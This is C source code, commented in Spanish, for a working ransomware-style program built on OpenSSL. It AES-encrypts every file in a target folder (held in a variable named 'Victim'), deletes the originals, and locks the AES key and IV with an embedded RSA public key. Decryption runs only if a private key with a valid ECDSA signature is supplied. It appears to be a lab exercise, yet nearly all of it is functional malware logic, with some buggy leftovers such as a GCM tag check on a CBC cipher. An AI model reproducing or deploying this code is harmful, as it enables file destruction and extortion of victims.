#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <tchar.h>
#include <Shlwapi.h>
#include <dirent.h>
#include <direct.h>
#include <openssl/ec.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/bio.h>

const char *clavePublicaRSA = "-----BEGIN RSA PUBLIC KEY-----\n"
                              "MIIBCgKCAQEAty4ltThvy3ZjbhZ/tVkXLSUZwXffEpoj+qWymwokbCnVshS1VrS1\n"
                              "OJ8CYt0jIUPU8E9NBRvvez9PlKPpQ5EGpdJK2kriumGURM20W48SeC/8gruxw6Hg\n"
                              "gCHw3UTIQSUfAOKGkz7E3D3rW1wUkEijrHWuRz5yVc6hfCfHyA0IXGpJTJiLPjj0\n"
                              "U6XFhn1OCJ19DpjHn68yUb4UswkhyGS9WolYngeKWUIIXRevQ9e9QbfISVBI4gUg\n"
                              "PEy5+fwXDoPvuMCW3inyWcPaOzAhT/DLYfvX2Xf5SFPnm695ZUEJatOIDs+VpPH9\nntuXAsVNwjo/f8HQ8rtk32KFfxvpv+FHBwIDAQAB\n"
                              "-----END RSA PUBLIC KEY-----";
const char *clavePublicaFirma = "-----BEGIN PUBLIC KEY-----\n"
                                "MFYwEAYHKoZIzj0CAQYFK4EEAAoDQgAEazNs8zbRN8SMetU61wxckxuwnxJXd6Kb\n"
                                "XoE6bafsYC5gK1DpwqCbf3lD4h/1W1O65RFQua4EF4iqO4uKNq8w/g==\n"
                                "-----END PUBLIC KEY-----";

// Función para cargar la clave pública de ECDSA desde una cadena PEM
EC_KEY *loadEcdsaPublicKeyFromPEM(const char *pemKey) {
    BIO *bio = BIO_new_mem_buf((void *)pemKey, -1);
    if (!bio) {
        perror("Error al crear el objeto BIO para la clave pública de ECDSA");
        return NULL;
    }

    EC_KEY *publicKey = PEM_read_bio_EC_PUBKEY(bio, NULL, NULL, NULL);
    BIO_free(bio);

    if (!publicKey) {
        perror("Error al leer la clave pública de ECDSA desde la cadena PEM");
        return NULL;
    }

    return publicKey;
}

void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    printf("carencias");
    abort();
}

int verifyWithECDSA(const char *public_key_path, const char *file_path, const char *signature_path) {
    int ret = 1;

    // Leer la clave pública

    EC_KEY *public_key = loadEcdsaPublicKeyFromPEM(clavePublicaFirma);
    if (!public_key)
        handleErrors();

    // Leer el archivo a verificar
    FILE *file = fopen(file_path, "rb");
    if (!file)
        handleErrors();

    fseek(file, 0L, SEEK_END); // Puntero a final archivo

    long file_size = ftell(file); // Determina el tamaño del archivo

    rewind(file); // Puntero vuelve a inicio del archivo

    unsigned char *data = malloc(file_size); // Asigna memoria para almacenar el contenido del archivo
    if (!data)
        handleErrors();

    fread(data, 1, file_size, file);
    fclose(file);

    // Leer la firma a verificar
    FILE *signature_file = fopen(signature_path, "rb");
    if (!signature_file)
        handleErrors();

    fseek(signature_file, 0L, SEEK_END); // Puntero a final archivo

    long signature_size = ftell(signature_file); // Determina el tamaño de la firma

    rewind(signature_file); // Puntero vuelve a inicio del archivo

    unsigned char *signature_data = malloc(signature_size); // Asigna memoria para almacenar la firma
    if (!signature_data)
        handleErrors();

    fread(signature_data, 1, signature_size, signature_file);
    fclose(signature_file);

    // Verificar la firma
    ECDSA_SIG *signature = d2i_ECDSA_SIG(NULL, (const unsigned char**)&signature_data, signature_size);
    if (!signature)
        handleErrors();

    if (ECDSA_do_verify(data, file_size, signature, public_key) != 1) {
        fprintf(stderr, "Error al verificar la firma\n");
        ERR_print_errors_fp(stderr); // Imprimir detalles del error
        ret = 0; // La verificación falló
    } else {
        ret = 1;
        printf("La firma es válida.\n");
    }
    // Liberar recursos
    ECDSA_SIG_free(signature);
    EC_KEY_free(public_key);
    free(data);
    free(signature_data);

    return ret;
}

/*int verifyWithECDSA(const char *signatureFile, const char *ecdsaPublicKeyPEM, const char *privateKeyFile) {
    // Cargar la firma desde el archivo
    FILE *signatureFilePtr = fopen(signatureFile, "rb");
    if (!signatureFilePtr) {
        perror("Error al abrir el archivo con la firma");
        return 0;
    }

    fseek(signatureFilePtr, 0, SEEK_END);
    long signatureFileSize = ftell(signatureFilePtr);
    fseek(signatureFilePtr, 0, SEEK_SET);

    unsigned char *signature = (unsigned char *)malloc(signatureFileSize);
    if (!signature) {
        perror("Error de asignación de memoria para la firma");
        fclose(signatureFilePtr);
        return 0;
    }

    fread(signature, 1, signatureFileSize, signatureFilePtr);
    fclose(signatureFilePtr);

    // Cargar la clave pública ECDSA desde el archivo PEM
    BIO *ecdsaBio = BIO_new_mem_buf((void *)ecdsaPublicKeyPEM, -1);
    if (!ecdsaBio) {
        perror("Error al crear el objeto BIO para la clave pública ECDSA");
        free(signature);
        return 0;
    }

    EC_KEY *ecdsaKey = PEM_read_bio_EC_PUBKEY(ecdsaBio, NULL, NULL, NULL);
    BIO_free(ecdsaBio);

    if (!ecdsaKey) {
        perror("Error al leer la clave pública ECDSA");
        free(signature);
        return 0;
    }

    // Crear un objeto EVP_PKEY a partir de la clave pública ECDSA
    EVP_PKEY *pkey = EVP_PKEY_new();
    if (!pkey) {
        perror("Error al crear el objeto EVP_PKEY para la clave pública ECDSA");
        free(signature);
        EC_KEY_free(ecdsaKey);
        return 0;
    }

    if (EVP_PKEY_set1_EC_KEY(pkey, ecdsaKey) != 1) {
        perror("Error al configurar la clave pública ECDSA en el objeto EVP_PKEY");
        free(signature);
        EC_KEY_free(ecdsaKey);
        EVP_PKEY_free(pkey);
        return 0;
    }

    // Crear el contexto de verificación ECDSA
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    if (!mdctx) {
        perror("Error al crear el contexto de verificación");
        free(signature);
        EC_KEY_free(ecdsaKey);
        EVP_PKEY_free(pkey);
        return 0;
    }

    // Inicializar la verificación ECDSA con el objeto EVP_PKEY
    if (EVP_DigestVerifyInit(mdctx, NULL, EVP_sha256(), NULL, pkey) != 1) {
        perror("Error al inicializar la verificación ECDSA");
        free(signature);
        EC_KEY_free(ecdsaKey);
        EVP_PKEY_free(pkey);
        EVP_MD_CTX_free(mdctx);
        return 0;
    }

    // Actualizar la verificación con los datos de la firma
    if (EVP_DigestVerifyUpdate(mdctx, signature, signatureFileSize) != 1) {
        perror("Error al actualizar la verificación con los datos de la firma");
        free(signature);
        EC_KEY_free(ecdsaKey);
        EVP_PKEY_free(pkey);
        EVP_MD_CTX_free(mdctx);
        return 0;
    }

    // Leer la clave privada desde el archivo PEM
    FILE *privateKeyFilePtr = fopen(privateKeyFile, "rb");
    if (!privateKeyFilePtr) {
        perror("Error al abrir el archivo de la clave privada");
        free(signature);
        EC_KEY_free(ecdsaKey);
        EVP_PKEY_free(pkey);
        EVP_MD_CTX_free(mdctx);
        return 0;
    }

    // Cargar la clave privada desde el archivo PEM
    fseek(privateKeyFilePtr, 0, SEEK_END);
    long originalRsaDataSize = ftell(privateKeyFilePtr);
    fseek(privateKeyFilePtr, 0, SEEK_SET);

    char *originalRsaData = (char *)malloc(originalRsaDataSize + 1);
    if (!originalRsaData) {
        perror("Error de asignación de memoria para los datos originales");
        fclose(privateKeyFilePtr);
        free(signature);
        EC_KEY_free(ecdsaKey);
        EVP_PKEY_free(pkey);
        EVP_MD_CTX_free(mdctx);
        return 0;
    }

    fread(originalRsaData, 1, originalRsaDataSize, privateKeyFilePtr);
    fclose(privateKeyFilePtr);

    originalRsaData[originalRsaDataSize] = '\0';

    // Verificar la firma
    EVP_PKEY_CTX *pkey_ctx = EVP_PKEY_CTX_new(pkey, NULL);
    if (!pkey_ctx) {
        perror("Error al crear el contexto de clave pública");
        free(signature);
        free(originalRsaData);
        EC_KEY_free(ecdsaKey);
        EVP_PKEY_free(pkey);
        EVP_MD_CTX_free(mdctx);
        return 0;
    }

    if (EVP_PKEY_verify_init(pkey_ctx) != 1) {
        perror("Error al inicializar la verificación ECDSA");
        EVP_PKEY_CTX_free(pkey_ctx);
        free(signature);
        free(originalRsaData);
        EC_KEY_free(ecdsaKey);
        EVP_PKEY_free(pkey);
        EVP_MD_CTX_free(mdctx);
        return 0;
    }

    if (EVP_PKEY_verify(pkey_ctx, signature, signatureFileSize, (const unsigned char *)originalRsaData, originalRsaDataSize) != 1) {
        perror("Firma incorrecta");
        EVP_PKEY_CTX_free(pkey_ctx);
        free(signature);
        free(originalRsaData);
        EC_KEY_free(ecdsaKey);
        EVP_PKEY_free(pkey);
        EVP_MD_CTX_free(mdctx);
        return 0;
    }

    EVP_PKEY_CTX_free(pkey_ctx);

    // Imprimir el resultado de la verificación
    printf("La firma es válida.\n");

    // Liberar la memoria y recursos
    free(signature);
    free(originalRsaData);
    EC_KEY_free(ecdsaKey);
    EVP_PKEY_free(pkey);
    EVP_MD_CTX_free(mdctx);

    return 1;
}*/

RSA *parseRSAPublicKeyFromPEMString(const char *pemKey) {
    BIO *bio = BIO_new_mem_buf((void *)pemKey, -1);  // -1 para que BIO determine la longitud automáticamente

    if (bio == NULL) {
        // Manejar el error
        return NULL;
    }

    RSA *rsa = PEM_read_bio_RSAPublicKey(bio, NULL, NULL, NULL);

    if (rsa == NULL) {
        // Manejar el error
        BIO_free(bio);
        return NULL;
    }

    BIO_free(bio);
    return rsa;
}

void encryptWithPublicKey(const char* inputFileName, const char* outputFileName, RSA* publicKey) {
    // Abre el archivo de entrada y el archivo de salida
    FILE* inputFile = fopen(inputFileName, "rb");
    FILE* outputFile = fopen(outputFileName, "wb");

    if (inputFile && outputFile) {
        // Tamaño del buffer de entrada
        size_t inputBufferSize = RSA_size(publicKey);

        unsigned char inputBuffer[inputBufferSize];
        unsigned char outputBuffer[inputBufferSize];

        // Lee datos del archivo de entrada y los encripta con la clave pública
        while (1) {
            size_t bytesRead = fread(inputBuffer, 1, inputBufferSize, inputFile);
            if (bytesRead == 0) {
                break;
            }

            int encryptedSize = RSA_public_encrypt(bytesRead, inputBuffer, outputBuffer, publicKey, RSA_PKCS1_PADDING);
            if (encryptedSize < 0) {
                // Manejo de error
                break;
            }

            fwrite(outputBuffer, 1, encryptedSize, outputFile);
        }

        // Cierra los archivos
        fclose(inputFile);
        fclose(outputFile);

        remove(inputFileName);
    }
}

void decryptWithPrivateKey(const char* inputFileName, const char* outputFileName, RSA* privateKey) {
    // Abre el archivo cifrado de entrada y el archivo de salida
    FILE* inputFile = fopen(inputFileName, "rb");
    FILE* outputFile = fopen(outputFileName, "wb");

    if (inputFile && outputFile) {
        // Tamaño del buffer de entrada
        size_t inputBufferSize = RSA_size(privateKey);

        unsigned char inputBuffer[inputBufferSize];
        unsigned char outputBuffer[inputBufferSize];

        // Lee datos cifrados del archivo de entrada y los descifra con la clave privada
        while (1) {
            size_t bytesRead = fread(inputBuffer, 1, inputBufferSize, inputFile);
            if (bytesRead == 0) {
                break;
            }

            int decryptedSize = RSA_private_decrypt(bytesRead, inputBuffer, outputBuffer, privateKey, RSA_PKCS1_PADDING);
            if (decryptedSize < 0) {
                // Manejo de error
                break;
            }

            fwrite(outputBuffer, 1, decryptedSize, outputFile);
        }

        // Cierra los archivos
        fclose(inputFile);
        fclose(outputFile);

        remove(inputFileName);
    }
}

void generateRandomKey(unsigned char *key, int keyLength) {
    RAND_bytes(key, keyLength);
}

void generateRandomIV(unsigned char *iv, int ivLength) {
    RAND_bytes(iv, ivLength);
}

void saveKeyToFile(const char *keyFileName, const unsigned char *key, int keyLength) {
    FILE *keyFile = fopen(keyFileName, "wb");
    if (keyFile) {
        fwrite(key, 1, keyLength, keyFile);
        fclose(keyFile);
    }
}

void saveIVToFile(const char *ivFileName, const unsigned char *iv, int ivLength) {
    FILE *ivFile = fopen(ivFileName, "wb");
    if (ivFile) {
        fwrite(iv, 1, ivLength, ivFile);
        fclose(ivFile);
    }
}


int main()
{

    // Inicializamos OpenSSL//
    OpenSSL_add_all_algorithms();

    // Definir la clave y el vector de inicialización (IV)
    unsigned char key[32];
    unsigned char iv[16];
    // Definir la ruta completa al archivo de la clave
    const char *keyFileName = "C:\\Users\\usuario\\Desktop\\Clave.txt"; 
    const char *EnckeyFileName = "C:\\Users\\usuario\\Desktop\\Clave.txt.enc"; 

    // Definir la ruta completa al archivo del IV
    const char *ivFileName = "C:\\Users\\usuario\\Desktop\\IV.txt"; 
    const char *EncivFileName = "C:\\Users\\usuario\\Desktop\\IV.txt.enc"; 

    // Definimos la carpeta a encriptar//
    const char *Target = "C:\\Users\\usuario\\Desktop\\Objetivo";
    DIR *Victim = opendir(Target);

    const char *Encriptado = "C:\\Users\\usuario\\Desktop\\Encriptados";
    const char *Clave = "C:\\Users\\usuario\\Desktop";
    
    struct dirent *File;

    // claves RSA //
    const char *firma = "C:\\Users\\usuario\\Desktop\\firma_ecdsa.txt";
    const char *PrivateKey = "C:\\Users\\usuario\\Desktop\\clave_privada_rsa.pem";

    if ((File = readdir(Victim)) != NULL){
    int Envirao = mkdir(Encriptado);
    int Secreto = mkdir(Clave);
    generateRandomKey(key, sizeof(key));
    generateRandomIV(iv, sizeof(iv));

    // Lectura de los archivos del fichero //
    while ((File = readdir(Victim)) != NULL)
    {   
        
        if (strcmp(File->d_name, ".") != 0 && strcmp(File->d_name, "..") != 0) {
            printf("Nombre del archivo: %s\n", File->d_name);

          LPCSTR extension = PathFindExtensionA(File->d_name);

            // Comprobamos si está encriptado o no el archivo //
            // ENCRIPTAMOS //
            if(_stricmp(extension, ".crf") != 0){
                char inputFileName[1024];
                PathCombineA(inputFileName, Target, File->d_name);
                printf("Ruta del archivo: %s\n", inputFileName);
                FILE *inputFile = fopen(inputFileName, "rb");
                const char *enc = ".crf";
                char outputFileName[1024]; // Declarar un búfer para el nombre de archivo de salida
                strcpy(outputFileName, File->d_name); // Copiar el nombre del archivo original
                strcat(PathCombineA(outputFileName, Encriptado, File->d_name), enc); // Concatenar la extensión ".enc"

                FILE *outputFile = fopen(outputFileName, "wb"); // Abrir el archivo de salida

                // Comprobamos la correcta apertura de los ficheros //
                if(inputFile && outputFile){
                    printf("se abren bien los archivos");
                    // Creamos el contexto
                    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
                    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, NULL, NULL);
                    EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv);
                    unsigned char inBuf[1024];
                    unsigned char outBuf[1040];
                    int bytesRead, bytesWritten;

                    // Comenzamos a encriptar el archivo //
                    while ((bytesRead = fread(inBuf, 1, sizeof(inBuf), inputFile)) > 0) {

                        EVP_EncryptUpdate(ctx, outBuf, &bytesWritten, inBuf, bytesRead);
                        fwrite(outBuf, 1, bytesWritten, outputFile);
                        
                    }
                    EVP_EncryptFinal_ex(ctx, outBuf, &bytesWritten);
                    fwrite(outBuf, 1, bytesWritten, outputFile);

                    if (inputFile != NULL) {
                        fclose(inputFile);
                    }

                    if (outputFile != NULL) {
                        fclose(outputFile);
                    }

                    saveIVToFile(ivFileName,iv,sizeof(iv));
                    saveKeyToFile(keyFileName,key,sizeof(key));

                    RSA *rsa = parseRSAPublicKeyFromPEMString(clavePublicaRSA);
                    encryptWithPublicKey(keyFileName,EnckeyFileName,rsa);
                    encryptWithPublicKey(ivFileName,EncivFileName,rsa);
                    RSA_free(rsa);
                    
                    remove(inputFileName);
                    rmdir(Target);

                }else {
                    printf("Error al abrir uno o ambos archivos.\n");
                }
            }
        } 
    }
    }else {
        if (verifyWithECDSA(clavePublicaFirma, PrivateKey, firma)) {
        FILE *privateKeyFileSigned = fopen(PrivateKey, "rb");
        RSA *clavePrivada = PEM_read_RSAPrivateKey(privateKeyFileSigned, NULL, NULL, NULL);
        fclose(privateKeyFileSigned);
        decryptWithPrivateKey(EnckeyFileName, keyFileName, clavePrivada);
        decryptWithPrivateKey(EncivFileName, ivFileName, clavePrivada);
        RSA_free(clavePrivada);
        

        int Objetivo = mkdir(Target);
        DIR *Envirao =opendir(Encriptado);
        while ((File = readdir(Envirao)) != NULL){
            
            if (strcmp(File->d_name, ".") != 0 && strcmp(File->d_name, "..") != 0) {
                LPCSTR extension = PathFindExtensionA(File->d_name);

            // Comprobamos si está encriptado o no el archivo //
            // Desencriptamos //
            if(_stricmp(extension, ".crf") == 0){
                printf("La extensión es .crf \n");
                // Lee la clave y la extrae//
                FILE *keyFile = fopen(keyFileName, "rb");
                fread(key, 1, sizeof(key), keyFile);
                fclose(keyFile);

                // Comprueba que IV existe, lo lee y lo extrae//
                FILE *ivFile = fopen(ivFileName, "rb");
                if (ivFile) {
                fread(iv, 1, sizeof(iv), ivFile);
                fclose(ivFile);
        
                char inputFileName[1024];
                PathCombineA(inputFileName, Encriptado, File->d_name);
                FILE *inputFile = fopen(inputFileName, "rb");
                const char *enc = ".crf";
                char outputFileName[1024]; // Declarar un búfer para el nombre de archivo de salida
                strcpy(outputFileName, File->d_name); // Copiar el nombre del archivo original
                char *encPtr = strstr(PathCombineA(outputFileName,Target,File->d_name), enc);

                // Si se encuentra la cadena ".enc", eliminarla
                if (encPtr != NULL) {
                    *encPtr = '\0'; // Establecer el carácter nulo en el lugar de ".enc"
                }
                FILE *outputFile = fopen(outputFileName, "wb"); // Abrir el archivo de salida
                if(inputFile && outputFile){
                    printf("input y output fino \n");
                    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
                    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, NULL, NULL);
                    EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv);
                    unsigned char inBuf[1024];
                    unsigned char outBuf[1040];
                    int bytesRead, bytesWritten;

                    // Comenzamos a desencriptar el archivo //
                    while ((bytesRead = fread(inBuf, 1, sizeof(inBuf), inputFile)) > 0) {

                        EVP_DecryptUpdate(ctx, outBuf, &bytesWritten, inBuf, bytesRead);
                        fwrite(outBuf, 1, bytesWritten, outputFile);
                        
                    }
                    EVP_DecryptFinal_ex(ctx, outBuf, &bytesWritten);
                    fwrite(outBuf, 1, bytesWritten, outputFile);

                    // Obtener la etiqueta de autenticación del archivo encriptado
                    unsigned char tag[16];
                    fread(tag, 1, sizeof(tag), inputFile);

                    // Establecer la etiqueta de autenticación en el contexto de desencriptado
                    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, sizeof(tag), tag);

                    // Verificar la autenticación
                    int result = EVP_DecryptFinal_ex(ctx, outBuf, &bytesWritten);
                    EVP_CIPHER_CTX_free(ctx);
                    if (inputFile != NULL) {
                        fclose(inputFile);
                    }

                    if (outputFile != NULL) {
                        fclose(outputFile);
                    }
                    remove(inputFileName);
                    
                }
                }

            }
            }
        }
        rmdir(Encriptado);
        remove(keyFileName);
        remove(ivFileName);
        remove(PrivateKey);
        } else {
            printf("Firma incorrecta");
        }

    }
    return 0;

}